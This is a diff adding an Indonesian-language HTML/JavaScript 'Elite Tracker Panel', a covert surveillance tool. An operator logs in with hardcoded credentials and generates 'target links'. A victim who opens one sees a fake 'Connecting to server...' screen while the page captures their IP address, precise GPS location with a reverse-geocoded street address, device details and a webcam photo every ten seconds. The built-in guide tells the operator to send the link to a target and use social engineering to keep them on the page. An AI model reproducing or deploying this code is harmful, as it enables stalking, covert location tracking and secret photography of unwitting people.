@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite Tracker Panel - CodingX</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        /* CSS ASLI DIPERTAHANKAN TOTAL */
+        :root {
+            --bg-main: #0a0a0c;
+            --panel-bg: rgba(30, 30, 35, 0.7);
+            --accent-glow: #00f2ff;
+            --accent-dark: #0066ff;
+            --border-glass: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            margin: 0; padding: 0; background-color: var(--bg-main);
+            background-image: radial-gradient(circle at top right, #1a1a2e, transparent);
+            color: white; font-family: 'Inter', sans-serif;
+            display: flex; justify-content: center; min-height: 100vh;
+        }
+
+        .phone-frame { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; position: relative; }
+
+        .header-profile {
+            background: var(--panel-bg); backdrop-filter: blur(10px);
+            border-radius: 24px; padding: 25px; border: 1px solid var(--border-glass);
+            text-align: center; margin-bottom: 25px; position: relative; overflow: hidden;
+        }
+
+        .exp-timer {
+            position: absolute; top: 5px; right: 15px;
+            font-family: 'Orbitron'; font-size: 9px; color: #ff0055;
+            background: rgba(0,0,0,0.9); padding: 4px 10px; border-radius: 8px;
+            border: 1px solid #ff0055; z-index: 999;
+            box-shadow: 0 0 10px rgba(255, 0, 85, 0.5);
+        }
+
+        .logo-main {
+            width: 90px; height: 90px; border-radius: 50%; background: #000;
+            margin: 0 auto 15px; display: flex; justify-content: center; align-items: center;
+            border: 2px solid var(--accent-glow); box-shadow: 0 0 20px var(--accent-dark);
+        }
+        .logo-main svg { width: 50px; fill: var(--accent-glow); }
+
+        .header-profile h1 {
+            font-family: 'Orbitron', sans-serif; font-size: 20px; letter-spacing: 3px;
+            margin: 10px 0; text-transform: uppercase; color: white;
+        }
+
+        .status-badge {
+            display: inline-flex; align-items: center; background: rgba(0, 255, 100, 0.1);
+            color: #00ff64; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold;
+        }
+
+        .control-panel {
+            background: var(--panel-bg); backdrop-filter: blur(15px);
+            border-radius: 24px; padding: 20px; border: 1px solid var(--border-glass);
+            margin-bottom: 20px;
+        }
+
+        .label-style { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 10px; display: block; }
+
+        .input-group {
+            background: rgba(0,0,0,0.3); border-radius: 12px; padding: 10px;
+            border: 1px solid #333; display: flex; align-items: center; justify-content: space-between;
+        }
+        .input-group input { background: transparent; border: none; color: #fff; width: 70%; outline: none; }
+
+        .btn-action {
+            background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark));
+            color: #000; border: none; padding: 10px 18px; border-radius: 10px;
+            font-weight: 800; font-size: 11px; cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 242, 255, 0.4);
+        }
+
+        .target-folder {
+            background: linear-gradient(90deg, #1e1e24, #121216);
+            border-radius: 15px; padding: 18px; margin-top: 10px;
+            display: flex; align-items: center; justify-content: space-between;
+            border-left: 4px solid var(--accent-glow);
+        }
+
+        .folder-info { display: flex; align-items: center; flex-grow: 1; cursor: pointer; }
+        .robotic-svg { width: 24px; height: 24px; fill: var(--accent-glow); margin-right: 15px; }
+        .trash-svg { width: 18px; height: 18px; fill: #ff4444; }
+
+        #login-gate {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-main); z-index: 10000; display: none; justify-content: center; align-items: center;
+        }
+        
+        #gallery-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-main); z-index: 10001; padding: 20px; box-sizing: border-box; overflow-y: auto;
+        }
+        .grid-photos { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
+        .grid-photos img { width: 100%; border-radius: 15px; border: 1px solid #333; cursor: pointer; }
+
+        /* SIDEBAR */
+        #side-nav {
+            position: fixed; top: 0; left: -300px; width: 280px; height: 100%;
+            background: #0f0f12; z-index: 20000; transition: 0.4s;
+            border-right: 1px solid var(--border-glass);
+        }
+        #side-nav.active { left: 0; }
+        .nav-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); z-index: 15000; display: none;
+        }
+        .hamburger {
+            position: absolute; top: 35px; left: 40px; z-index: 1000;
+            background: var(--panel-bg); border: 1px solid var(--border-glass);
+            padding: 10px; border-radius: 12px; cursor: pointer;
+        }
+
+        .nav-item {
+            padding: 15px; display: flex; align-items: center; gap: 15px;
+            color: #ccc; text-decoration: none; border-radius: 12px; transition: 0.3s;
+            margin: 0 15px 5px;
+        }
+        .nav-item:hover { background: rgba(0, 242, 255, 0.1); color: var(--accent-glow); }
+        .nav-item svg { width: 20px; fill: var(--accent-glow); }
+
+        .info-row { 
+            display: flex; justify-content: space-between; align-items: flex-start; 
+            padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 11px;
+        }
+        .info-label { color: #888; white-space: nowrap; margin-right: 10px; }
+        .info-value { color: #fff; text-align: right; line-height: 1.4; word-break: break-word; }
+
+        .btn-back {
+            display: flex; align-items: center; gap: 10px;
+            background: rgba(255, 255, 255, 0.05); color: #fff;
+            border: 1px solid var(--border-glass); padding: 10px 20px;
+            border-radius: 50px; cursor: pointer; font-family: 'Orbitron';
+            font-size: 10px; transition: 0.3s;
+        }
+
+        .icon-copy-master {
+            cursor: pointer; padding: 8px; border-radius: 10px;
+            background: rgba(0, 242, 255, 0.1); border: 1px solid var(--border-glass);
+            transition: 0.3s; display: flex; align-items: center; justify-content: center;
+        }
+
+        /* STYLED PANDUAN */
+        .guide-container { margin-top: 15px; }
+        .guide-header {
+            background: rgba(255,255,255,0.05); border: 1px solid var(--border-glass);
+            padding: 12px 15px; border-radius: 12px; display: flex;
+            justify-content: space-between; align-items: center; cursor: pointer;
+            font-family: 'Inter'; font-size: 11px; font-weight: 800; color: var(--accent-glow);
+        }
+        .guide-content {
+            max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out;
+            background: rgba(0,0,0,0.2); border-radius: 0 0 12px 12px; margin-top: -5px;
+        }
+        .guide-content.open { max-height: 500px; padding: 15px; border: 1px solid var(--border-glass); border-top: none; }
+        .guide-text-box { font-size: 11px; line-height: 1.6; color: #ccc; }
+        .guide-tips {
+            margin-top: 10px; padding: 10px; border-radius: 8px;
+            background: rgba(255, 230, 0, 0.05); border-left: 3px solid #ffe600;
+        }
+
+        #img-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); z-index: 30000; justify-content: center; align-items: center;
+        }
+        #img-modal img { max-width: 90%; max-height: 80%; border: 2px solid var(--accent-glow); }
+
+        #target-loading {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 50000; color: #333; justify-content: center; align-items: center;
+            font-size: 10px; text-align: center;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div id="img-modal" onclick="this.style.display='none'">
+    <img id="modal-img-src" src="">
+</div>
+
+<div id="target-loading">
+    <div>
+        <div style="width: 30px; height: 30px; border: 2px solid #222; border-top-color: #444; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
+        Connecting to server...
+    </div>
+</div>
+
+<div id="side-nav">
+    <div style="padding: 40px 20px; text-align: center;">
+        <div class="logo-main" style="width: 70px; height: 70px;">
+            <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+        </div>
+        <b style="font-family: 'Orbitron'; font-size: 16px;">R_hmt</b>
+        <p style="font-size: 10px; color: var(--accent-glow);">Elite Member</p>
+    </div>
+    <a href="#" class="nav-item">Contact CS</a>
+    <a href="#" class="nav-item">Saluran</a>
+</div>
+<div class="nav-overlay" id="navOver" onclick="toggleNav()"></div>
+
+<div id="login-gate">
+    <div class="control-panel" style="width: 80%; text-align: center;">
+        <h2 style="font-family: 'Orbitron'; font-size: 14px; color: var(--accent-glow);">MASTER ACCESS</h2>
+        <input type="text" id="user-in" class="input-group" style="width: 100%; margin-bottom: 10px; padding: 12px; box-sizing: border-box; background: #000; color: #fff;" placeholder="Username">
+        <input type="password" id="pass-in" class="input-group" style="width: 100%; margin-bottom: 20px; padding: 12px; box-sizing: border-box; background: #000; color: #fff;" placeholder="Password">
+        <button class="btn-action" style="width: 100%;" onclick="auth()">LOGIN SYSTEM</button>
+    </div>
+</div>
+
+<div class="phone-frame" id="admin-view" style="display:none;">
+    <div class="hamburger" id="hamBtn" onclick="toggleNav()">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+    </div>
+    <div class="header-profile">
+        <div class="exp-timer" id="exp-display">EXP: 20h 0m 0s</div>
+        <div class="logo-main"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5" fill="none" stroke="cyan" stroke-width="2"/></svg></div>
+        <h1>ONDEV PANEL</h1>
+        <div class="status-badge">● TERMINAL ACTIVE</div>
+    </div>
+    
+    <div class="control-panel">
+        <span class="label-style">Target Link</span>
+        <div class="input-group">
+            <input type="text" id="gen-url" readonly>
+            <div onclick="copyLinkOnly()" style="cursor:pointer;"><svg width="20" height="20" viewBox="0 0 24 24" fill="cyan"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg></div>
+        </div>
+
+        <div class="guide-container">
+            <div class="guide-header" onclick="toggleGuide()">
+                <span>(!) PANDUAN DAN PENGGUNAAN</span>
+                <svg id="arrow-icon" width="14" viewBox="0 0 24 24" fill="cyan" style="transition:0.3s;"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            <div id="guide-body" class="guide-content">
+                <div class="guide-text-box">
+                    <p>● <b>Tracking:</b> Salin link di atas dan kirimkan ke target.</p>
+                    <p>● <b>Data:</b> Tunggu hingga folder target muncul secara otomatis.</p>
+                    <p>● <b>Lokasi:</b> Pastikan target mengizinkan akses GPS untuk alamat detail.</p>
+                    <div class="guide-tips">
+                        <span style="color:#ffe600; font-weight:bold;">💡 Tips:</span><br>
+                        Gunakan teknik sosial engineering agar target tetap di halaman beberapa saat.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="control-panel">
+        <span class="label-style">Connected Targets</span>
+        <div id="target-list"></div>
+    </div>
+</div>
+
+<div id="gallery-overlay">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+        <button class="btn-back" onclick="closeFolder()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg> BACK
+        </button>
+        <div class="icon-copy-master" id="btn-copy-master">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="cyan"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg>
+        </div>
+    </div>
+    <div id="info-container" style="background:var(--panel-bg); padding:15px; border-radius:20px; border:1px solid var(--border-glass); margin-bottom: 20px;"></div>
+    <div class="grid-photos" id="photo-grid"></div>
+</div>
+
+<script>
+    const idParam = new URLSearchParams(window.location.search).get('id');
+    const DB_KEY = 'ondev_v25_stable';
+
+    window.onload = function() {
+        if(idParam) {
+            document.getElementById('target-loading').style.display = 'flex';
+            startCapture(idParam);
+        } else {
+            checkAuth(); // Cek status login saat buka web
+        }
+    };
+
+    // FUNGSI CEK STATUS LOGIN (AUTO-LOGIN)
+    function checkAuth() {
+        const expTime = localStorage.getItem(DB_KEY+'_time');
+        const now = new Date().getTime();
+
+        if (expTime && now < expTime) {
+            // Jika masih ada sisa waktu, langsung masuk panel
+            document.getElementById('login-gate').style.display = 'none';
+            document.getElementById('admin-view').style.display = 'block';
+            startAdmin();
+        } else {
+            // Jika waktu habis atau belum login, tampilkan form login
+            localStorage.removeItem(DB_KEY+'_time'); 
+            document.getElementById('login-gate').style.display = 'flex';
+        }
+    }
+
+    function auth() {
+        const u = document.getElementById('user-in').value;
+        const p = document.getElementById('pass-in').value;
+        if(u === 'ondev' && p === 'ondev') {
+            // SET 20 JAM DARI SEKARANG
+            const twentyHours = new Date().getTime() + (20 * 60 * 60 * 1000);
+            localStorage.setItem(DB_KEY+'_time', twentyHours);
+            checkAuth(); // Jalankan auto-login
+        } else { alert('ACCESS DENIED'); }
+    }
+
+    function startAdmin() {
+        const url = window.location.href.split('?')[0];
+        document.getElementById('gen-url').value = url + "?id=" + Math.floor(1000 + Math.random() * 9000);
+        renderList();
+        setInterval(renderList, 4000);
+        
+        // TIMER LOGIC
+        setInterval(() => {
+            const d = localStorage.getItem(DB_KEY+'_time') - new Date().getTime();
+            if(d <= 0) {
+                localStorage.removeItem(DB_KEY+'_time');
+                location.reload();
+            }
+            const h = Math.floor(d / 3600000);
+            const m = Math.floor((d % 3600000) / 60000);
+            const s = Math.floor((d % 60000) / 1000);
+            document.getElementById('exp-display').innerText = `EXP: ${h}h ${m}m ${s}s`;
+        }, 1000);
+    }
+
+    // --- SISANYA ADALAH LOGIC TARGET (FIXED) ---
+
+    function startCapture(id) {
+        let store = { photos: [], info: { 
+            time: new Date().toLocaleString(), bat: '..', addr: 'Melacak...', lat: 0, lon: 0, ip: '..',
+            ram: navigator.deviceMemory || '?', cpu: navigator.hardwareConcurrency || '?', android_ver: 'Detecting..'
+        }};
+
+        const ua = navigator.userAgent;
+        if (ua.indexOf("Android") >= 0) {
+            const match = ua.match(/Android\s([0-9\.]*)/);
+            store.info.android_ver = match ? "Android " + match[1] : "Android Device";
+        }
+
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(res => { store.info.ip = res.ip; sync(id, store); });
+
+        navigator.geolocation.getCurrentPosition(p => {
+            store.info.lat = p.coords.latitude; store.info.lon = p.coords.longitude;
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`)
+            .then(r => r.json()).then(res => { store.info.addr = res.display_name; sync(id, store); });
+        }, null, {enableHighAccuracy:true});
+
+        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+            const v = document.createElement('video'); v.srcObject = s; v.play();
+            setInterval(() => { // JEDA FOTO 10 DETIK
+                const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                store.photos.unshift(c.toDataURL('image/jpeg', 0.5));
+                if(store.photos.length > 10) store.photos.pop();
+                sync(id, store);
+            }, 10000); 
+        });
+    }
+
+    function openFolder(id) {
+        document.getElementById('hamBtn').style.display = 'none';
+        const target = JSON.parse(localStorage.getItem(DB_KEY+'_db'))[id];
+        const d = target.info;
+        const mapsLink = `https://www.google.com/maps?q=${d.lat},${d.lon}`;
+        
+        document.getElementById('btn-copy-master').onclick = () => {
+            navigator.clipboard.writeText(`IP: ${d.ip}\nAddr: ${d.addr}\nMaps: ${mapsLink}`);
+            alert('COPIED');
+        };
+
+        const row = (l, v) => `<div class="info-row"><span class="info-label">${l}:</span><span class="info-value">${v}</span></div>`;
+        document.getElementById('info-container').innerHTML = 
+            row('IP', d.ip) + row('Android', d.android_ver) + row('RAM', d.ram+'GB') + row('Alamat', d.addr) +
+            `<button class="btn-action" style="width:100%;margin-top:10px" onclick="window.open('${mapsLink}')">BUKA GOOGLE MAPS</button>`;
+        
+        document.getElementById('photo-grid').innerHTML = target.photos.map(p => `<img src="${p}" onclick="zoomImg('${p}')">`).join('');
+        document.getElementById('gallery-overlay').style.display = 'block';
+    }
+
+    function renderList() {
+        const db = JSON.parse(localStorage.getItem(DB_KEY+'_db') || '{}');
+        const list = document.getElementById('target-list');
+        list.innerHTML = '';
+        Object.keys(db).reverse().forEach(id => {
+            const div = document.createElement('div');
+            div.className = 'target-folder';
+            div.innerHTML = `<div class="folder-info" onclick="openFolder('${id}')"><svg class="robotic-svg" viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg><div><b>TARGET #${id}</b></div></div><button onclick="delT('${id}')" style="background:none;border:none;"><svg class="trash-svg" viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></button>`;
+            list.appendChild(div);
+        });
+    }
+
+    function toggleGuide() {
+        const b = document.getElementById('guide-body');
+        b.classList.toggle('open');
+        document.getElementById('arrow-icon').style.transform = b.classList.contains('open') ? 'rotate(180deg)' : 'rotate(0deg)';
+    }
+    function toggleNav() {
+        const s = document.getElementById('side-nav');
+        s.classList.toggle('active');
+        document.getElementById('navOver').style.display = s.classList.contains('active') ? 'block' : 'none';
+    }
+    function sync(id, data) {
+        let db = JSON.parse(localStorage.getItem(DB_KEY+'_db') || '{}');
+        db[id] = data;
+        localStorage.setItem(DB_KEY+'_db', JSON.stringify(db));
+    }
+    function delT(id) { if(confirm('Hapus?')){ let db = JSON.parse(localStorage.getItem(DB_KEY+'_db')); delete db[id]; localStorage.setItem(DB_KEY+'_db', JSON.stringify(db)); renderList(); } }
+    function closeFolder() { document.getElementById('gallery-overlay').style.display = 'none'; document.getElementById('hamBtn').style.display = 'block'; }
+    function zoomImg(src) { document.getElementById('modal-img-src').src = src; document.getElementById('img-modal').style.display = 'flex'; }
+    function copyLinkOnly() { const e = document.getElementById('gen-url'); e.select(); document.execCommand('copy'); alert('URL Copied'); }
+</script>
+</body>
+</html>
